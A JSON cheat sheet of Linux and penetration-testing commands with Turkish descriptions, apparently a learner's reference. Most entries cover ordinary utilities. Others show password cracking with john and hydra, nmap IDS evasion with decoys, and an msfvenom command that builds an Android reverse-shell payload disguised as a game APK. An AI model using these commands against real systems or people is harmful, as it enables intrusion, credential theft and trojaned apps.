@@ -1,0 +1,284 @@
+{
+    "subfinder": {
+        "desc": "Subdomain araştırması yapar",
+        "category": "Reconnaissance",
+        "usage": "subfinder -d domain.com",
+        "type": "Subdomain Discovery"
+    },
+    "wordlists":
+    {
+      "name": "Assetnote Wordlists",
+      "url": "https://wordlists.assetnote.io/",
+      "desc": "Farklı amaçlara yönelik kelime listeleri barındıran koleksiyon"
+    },
+    "chmod": {
+        "desc": "Dosya ve dizin izinlerini değiştirir",
+        "category": "File Management",
+        "usage": "chmod [permissions] [file/directory]",
+        "examples": ["chmod 755 script.sh", "chmod +x file.txt"],
+        "permissions": "Read(4), Write(2), Execute(1)"
+    },
+    "chown": {
+        "desc": "Dosya ve dizin sahipliğini değiştirir",
+        "category": "File Management", 
+        "usage": "chown [owner]:[group] [file/directory]",
+        "examples": ["chown user:group file.txt", "chown root file.txt"],
+        "note": "Root yetkisi gerekebilir"
+    },
+    "cewl": {
+    "desc": "Web sayfalarından wordlist üretir",
+    "usage": "cewl -d 3 -m 5 -w output.txt http://hedef.site",
+    "parameters": {
+        "-d 3": "Derinlik 3",
+        "-m 5": "Minimum kelime uzunluğu 5",
+        "-w warex1.txt": "Çıktı dosyası output.txt"
+    },
+    "category": "Wordlist Generation"
+    },
+    "wc": {
+        "desc": "Dosyadaki satır, kelime ve karakter sayısını gösterir",
+        "category": "Text Processing",
+        "usage": "wc [options] [file]",
+        "options": {
+            "-l": "Satır sayısı",
+            "-w": "Kelime sayısı", 
+            "-c": "Karakter sayısı"
+        },
+        "examples": ["wc -l file.txt", "wc -w file.txt"]
+    },
+    "uniq": {
+        "desc": "Tekrar eden satırları kaldırır, benzersiz liste oluşturur",
+        "category": "Text Processing",
+        "usage": "uniq [file]",
+        "examples": ["cat fruit | uniq", "cat fruits | sort | uniq > out"],
+        "note": "Genellikle sort ile birlikte kullanılır"
+    },
+    "grep": {
+        "desc": "Metin içinde arama yapar",
+        "category": "Text Processing",
+        "usage": "grep [options] [pattern] [file]",
+        "options": {
+            "-i": "Büyük/küçük harf duyarsız arama"
+        },
+        "examples": ["cat fruits | grep \"Ananas\"", "cat fruits | grep -i \"ananas\""]
+    },
+    "jobs": {
+        "desc": "Çalışan ve askıya alınmış işleri listeler",
+        "category": "Process Management",
+        "usage": "jobs",
+        "output": "İş numarası, durum ve komut bilgisi"
+    },
+    "fg": {
+        "desc": "Arka plandaki işi ön plana getirir",
+        "category": "Process Management", 
+        "usage": "fg [job_number]",
+        "examples": ["fg", "fg %2"],
+        "note": "CTRL+Z ile askıya alınan işleri devam ettirir"
+    },
+    "ps": {
+        "desc": "Çalışan işlemleri listeler",
+        "category": "Process Management",
+        "usage": "ps [options]",
+        "options": {
+            "-aux": "Tüm çalışan işlemleri detaylı gösterir"
+        },
+        "examples": ["ps", "ps -aux"]
+    },
+    "zip": {
+        "desc": "Dosyaları sıkıştırır ve şifre ile korur",
+        "category": "Archive Management",
+        "usage": "zip [options] [archive.zip] [files]",
+        "options": {
+            "--password": "Şifre ile koruma"
+        },
+        "examples": ["zip --password 12345678 gizli.zip hacker.txt"]
+    },
+    "gunzip": {
+        "desc": "Gzip ile sıkıştırılmış dosyaları açar",
+        "category": "Archive Management",
+        "usage": "gunzip [file.gz]",
+        "examples": ["sudo gunzip rockyou.txt.gz"],
+        "note": "Orijinal .gz dosyasını siler"
+    },
+    "zip2john": {
+        "desc": "Zip dosyasının hash değerini John the Ripper için çıkarır",
+        "category": "Password Cracking",
+        "usage": "zip2john [zip_file] > [output_file]",
+        "examples": ["zip2john gizli.zip > hash.txt"],
+        "tool": "John the Ripper"
+    },
+    "john": {
+        "desc": "Hash kırma ve şifre çözme aracı",
+        "category": "Password Cracking",
+        "usage": "john [options] [hash_file]",
+        "options": {
+            "--wordlist": "Kelime listesi kullanır"
+        },
+        "examples": ["john --wordlist=rockyou.txt hash.txt"],
+        "tool": "John the Ripper"
+    },
+    "cupp": {
+        "desc": "Özelleştirilmiş kelime listesi oluşturucu",
+        "category": "Password Cracking",
+        "usage": "cupp [options]",
+        "options": {
+            "-i": "İnteraktif mod"
+        },
+        "examples": ["cupp -i"],
+        "note": "Kişisel bilgilere dayalı wordlist oluşturur"
+    },
+    "more": {
+        "desc": "Uzun metinlerde sayfa sayfa gezinme yapar",
+        "category": "Text Processing",
+        "usage": "more [file]",
+        "note": "Uzun listelerde gezinmek için kullanılır"
+    },
+    "python3": {
+        "desc": "Python HTTP sunucusu başlatır",
+        "category": "Network",
+        "usage": "python3 -m http.server [port] --bind [ip] --directory [path]",
+        "examples": ["python3 -m http.server 8080 --bind 192.168.23.128 --directory /path/to/directory"],
+        "note": "Basit HTTP sunucusu için kullanılır"
+    },
+    "hydra": {
+        "desc": "Brute force saldırı aracı",
+        "category": "Password Cracking",
+        "usage": "hydra [options] [protocol://target]",
+        "options": {
+            "-l": "Kullanıcı adı",
+            "-P": "Şifre listesi",
+            "-V": "Detaylı çıktı"
+        },
+        "examples": ["hydra -l username -P wordlist.txt -V ssh://192.168.1.1"],
+        "warning": "Sadece yetkili testlerde kullanın"
+    },
+    "ssh": {
+        "desc": "Güvenli uzak bağlantı kurar",
+        "category": "Network",
+        "usage": "ssh [username]@[ip_address]",
+        "examples": ["sudo ssh username@192.168.1.1"],
+        "note": "Secure Shell protokolü kullanır"
+    },
+    "nmap": {
+        "desc": "Ağ tarama ve port keşif aracı",
+        "category": "Network Scanning",
+        "usage": "nmap [options] [target]",
+        "options": {
+            "-sP": "Ping taraması (cihaz keşfi)",
+            "-sT": "TCP Connect taraması",
+            "-sS": "TCP SYN taraması",
+            "-sF": "FIN taraması", 
+            "-sX": "XMAS taraması",
+            "-sN": "NULL taraması",
+            "-sU": "UDP taraması",
+            "-f": "Paket fragmentation",
+            "-F": "Hızlı tarama",
+            "-D": "IP adresi aldatma"
+        },
+        "examples": [
+            "nmap -sP 10.117.31.1-255",
+            "nmap -sT 10.117.31.1-255", 
+            "nmap -sS 10.117.31.1-255",
+            "nmap -sX 10.117.31.1-255",
+            "nmap -sN 10.117.31.1-255",
+            "nmap -sU 10.117.31.1-255",
+            "nmap -sS -f 192.168.1.1",
+            "nmap -D RND:10 10.117.31.1-255"
+        ],
+        "techniques": {
+            "ping_scan": "Cihaz keşfi için ping gönderir",
+            "tcp_connect": "Tam TCP bağlantısı kurar",
+            "syn_scan": "SYN paketi gönderir, ACK->RST alır",
+            "fin_scan": "FIN paketi gönderir, RFC793 standardı",
+            "xmas_scan": "URG, PSH ve FIN paketleri gönderir",
+            "null_scan": "Boş flag'li paketler gönderir",
+            "udp_scan": "UDP portlarını tarar",
+            "fragmentation": "Paketleri bölerek IDS/Firewall atlatma",
+            "decoy": "Sahte IP adresleri kullanarak gizlenme"
+        },
+        "ids_evasion": {
+            "fragmentation": "MTU 1500 byte limitini kullanarak paket bölme",
+            "decoy_ips": "Farklı IP adreslerinden tarama yaparak gizlenme",
+            "timing": "Tarama hızını ayarlayarak tespit edilmemeye çalışma"
+        },
+        "note": "Sadece yetkili penetrasyon testlerinde kullanın"
+    },
+    "cat": {
+        "desc": "Linux terminalinde dosya okuma işlemini yapar",
+        "category": "File Management",
+        "usage": "cat [file]",
+        "examples": ["cat fruits", "cat file.txt"]
+    },
+    "sort": {
+        "desc": "Dosya içeriğini sıralar",
+        "category": "Text Processing",
+        "usage": "sort [file]",
+        "examples": ["cat fruits | sort | uniq > out"],
+        "note": "Genellikle uniq ile birlikte kullanılır"
+    },
+    "msfconsole": {
+        "desc": "Metasploit Framework konsol arayüzünü başlatır",
+        "category": "Penetration Testing",
+        "usage": "msfconsole",
+        "commands": {
+            "use": "Modül seçer",
+            "set": "Parametre ayarlar", 
+            "run": "Modülü çalıştırır",
+            "exploit": "Sömürü gerçekleştirir"
+        },
+        "note": "Zafiyet testi ve sömürü framework'ü"
+    },
+    "msfvenom": {
+        "desc": "Metasploit payload oluşturucu",
+        "category": "Penetration Testing",
+        "usage": "msfvenom -p [payload] [options] > [output]",
+        "examples": ["msfvenom -p android/meterpreter/reverse_tcp LHOST=myip LPORT=port > oyun.apk"],
+        "options": {
+            "-p": "Payload türü",
+            "LHOST": "Listener IP adresi",
+            "LPORT": "Listener portu"
+        }
+    },
+    "smbclient": {
+        "desc": "SMB/CIFS protokolü ile dosya paylaşımına erişir",
+        "category": "Network",
+        "usage": "smbclient [options] [service]",
+        "options": {
+            "-L": "Paylaşımları listeler",
+            "-U": "Kullanıcı adı belirtir"
+        },
+        "examples": ["smbclient -L 172.20.1.90 -U user%password"]
+    },
+    "nmblookup": {
+        "desc": "NetBIOS isim çözümlemesi yapar",
+        "category": "Network",
+        "usage": "nmblookup [options] [target]",
+        "options": {
+            "-A": "IP adresinden NetBIOS bilgilerini alır"
+        },
+        "examples": ["nmblookup -A 172.20.1.90"]
+    },
+    "whereis": {
+        "desc": "Komutun sistem üzerindeki konumunu bulur",
+        "category": "System Information",
+        "usage": "whereis [command]",
+        "examples": ["whereis ls"],
+        "note": "Binary, source ve manual sayfalarının yerini gösterir"
+    },
+    "binwalk": {
+        "desc": "Binary dosyaları analiz eder ve gizlenmiş içeriği bulur",
+        "category": "Forensics",
+        "usage": "binwalk [options] [file]",
+        "note": "Dosya içinde gizlenmiş verileri tespit eder"
+    },
+    "pip3": {
+        "desc": "Python3 paket yöneticisi",
+        "category": "Package Management",
+        "usage": "pip3 [command] [package]",
+        "examples": ["sudo pip3 install git+https://github.com/EntySec/Ghost --break-system-packages"],
+        "commands": {
+            "install": "Paket kurulumu",
+            "--break-system-packages": "Sistem paketlerini geçersiz kılar"
+        }
+    }
+}
